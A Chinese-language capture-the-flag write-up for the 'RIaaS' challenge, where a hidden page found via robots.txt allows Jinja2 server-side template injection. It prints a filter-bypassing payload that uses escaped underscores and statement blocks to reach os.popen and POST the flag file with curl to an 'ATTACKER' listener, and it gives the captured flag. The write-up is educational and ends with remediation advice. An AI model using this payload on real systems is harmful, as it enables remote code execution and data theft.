# RIaaS

## 题目简述

`robots.txt` 暴露了隐藏输入页 `/nottheflaglol`。页面把过滤后的用户名拼接进 `render_template_string`，形成 Jinja2 SSTI；过滤器删除 `_`、`{{`、`}}`，并要求输入中出现 `curl http://`。

## 解题过程

先访问：

```text
/robots.txt
```

其中的 `Disallow` 指向 `/nottheflaglol`。为绕过花括号过滤，使用 Jinja 语句块 `{% ... %}`；为绕过下划线过滤，在字符串中用 `\x5f` 生成 `_`。下面的条件表达式经 `request.application.__globals__.__builtins__.__import__` 取得 `os`，执行命令并把 flag POST 到监听端：

```jinja2
{% if request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('curl http://ATTACKER:9001 -d @flag')['read']() == 'a' %}{% endif %}
```

在攻击机监听对应端口后提交载荷，即可收到：

```text
n00bz{55t1_sur3_1s_4_h34d4ch3!}
```

## 方法总结

删除少量字符不能修复 SSTI，字符串转义和替代模板语法仍可恢复危险属性。根本修复方式是避免把用户输入作为模板源码渲染，并对必须执行的功能采用固定模板和结构化参数。
